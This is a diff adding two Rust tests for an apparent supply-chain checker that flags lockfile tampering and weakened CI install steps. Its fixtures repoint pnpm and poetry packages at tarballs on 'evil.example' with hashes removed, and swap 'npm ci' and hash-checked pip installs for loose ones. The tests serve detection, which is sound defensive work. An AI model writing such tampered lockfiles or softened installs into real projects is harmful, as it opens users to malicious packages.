@@ -3528,6 +3528,136 @@ fn a_push_run_reads_the_merged_pull_requests_body() {
 }
 
 #[test]
+fn pnpm_and_poetry_lockfiles_are_read_entry_by_entry() {
+    let repo = Repo::new();
+    repo.git(&["checkout", "-q", "main"]);
+    repo.write(
+        "web/package.json",
+        "{\"name\": \"web\", \"dependencies\": {\"left-pad\": \"1.3.0\"}}\n",
+    );
+    repo.write(
+        "web/pnpm-lock.yaml",
+        "lockfileVersion: '9.0'\npackages:\n  left-pad@1.3.0:\n    resolution: {integrity: sha512-abc}\n",
+    );
+    repo.write(
+        "svc/pyproject.toml",
+        "[project]\nname = \"svc\"\ndependencies = [\"requests==2.31.0\"]\n",
+    );
+    repo.write(
+        "svc/poetry.lock",
+        "[[package]]\nname = \"requests\"\nversion = \"2.31.0\"\nfiles = [{file = \"requests-2.31.0.tar.gz\", hash = \"sha256:abc\"}]\n",
+    );
+    repo.commit("chore: lockfiles");
+    repo.git(&["checkout", "-q", "-B", "work"]);
+    // Each lockfile repoints its package at another host and drops the hash.
+    repo.write(
+        "web/pnpm-lock.yaml",
+        "lockfileVersion: '9.0'\npackages:\n  left-pad@1.3.0:\n    resolution: {tarball: https://evil.example/left-pad.tgz}\n",
+    );
+    repo.write(
+        "svc/poetry.lock",
+        "[[package]]\nname = \"requests\"\nversion = \"2.31.0\"\nfiles = []\n\n[package.source]\ntype = \"url\"\nurl = \"https://evil.example/requests.tar.gz\"\n",
+    );
+    repo.commit("chore: repoint");
+    let run = repo.check(&[]);
+    assert_eq!(run.code, 1);
+    let mut rows: Vec<(String, String)> = run
+        .violations("dependency-delta")
+        .iter()
+        .map(|v| {
+            (
+                v["file"].as_str().unwrap().to_string(),
+                v["title"].as_str().unwrap().to_string(),
+            )
+        })
+        .collect();
+    rows.sort();
+    assert_eq!(
+        rows,
+        vec![
+            (
+                "svc/poetry.lock".into(),
+                "Lockfile Entry From New Source".into()
+            ),
+            (
+                "svc/poetry.lock".into(),
+                "Lockfile Integrity Hash Dropped".into()
+            ),
+            (
+                "web/pnpm-lock.yaml".into(),
+                "Lockfile Entry From New Source".into()
+            ),
+            (
+                "web/pnpm-lock.yaml".into(),
+                "Lockfile Integrity Hash Dropped".into()
+            ),
+        ],
+        "{:?}",
+        run.violations("dependency-delta")
+    );
+    assert!(
+        !notes_of(&run, "dependency-delta")
+            .iter()
+            .any(|n| n.contains("not analysed")),
+        "{:?}",
+        notes_of(&run, "dependency-delta")
+    );
+}
+
+#[test]
+fn frozen_install_flags_and_npm_ci_cannot_be_dropped_silently() {
+    let repo = Repo::new();
+    repo.git(&["checkout", "-q", "main"]);
+    let wf = |install: &str, py: &str| {
+        format!(
+            "name: CI\non:\n  pull_request:\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n      - name: install\n        run: {install}\n      - name: python deps\n        run: {py}\n      - name: test\n        run: npm test\n"
+        )
+    };
+    repo.write(
+        ".github/workflows/ci.yml",
+        &wf("npm ci", "pip install --require-hashes -r requirements.txt"),
+    );
+    repo.commit("ci: frozen installs");
+    repo.git(&["checkout", "-q", "-B", "work"]);
+
+    // Negative control: the flags stay while the commands grow.
+    repo.write(
+        ".github/workflows/ci.yml",
+        &wf(
+            "npm ci --no-audit",
+            "pip install --require-hashes --no-cache-dir -r requirements.txt",
+        ),
+    );
+    repo.commit("ci: quieter installs");
+    let quiet = repo.check(&[]);
+    assert!(
+        quiet.titles("ci-integrity").is_empty(),
+        "{:?}",
+        quiet.violations("ci-integrity")
+    );
+
+    // `npm ci` becomes `npm install`; `--require-hashes` is dropped.
+    repo.write(
+        ".github/workflows/ci.yml",
+        &wf("npm install", "pip install -r requirements.txt"),
+    );
+    repo.commit("ci: looser installs");
+    let run = repo.check(&[]);
+    assert_eq!(run.code, 1);
+    let mut titles = run.titles("ci-integrity");
+    titles.sort();
+    assert_eq!(
+        titles,
+        vec![
+            "Frozen Install Flag Dropped".to_string(),
+            "Install Command Softened".to_string()
+        ],
+        "{:?}",
+        run.violations("ci-integrity")
+    );
+}
+
+#[test]
 fn unsafe_trait_with_a_safety_doc_section_abc_stubs_and_past_intervals_are_not_findings() {
     let repo = Repo::new();
     repo.write(
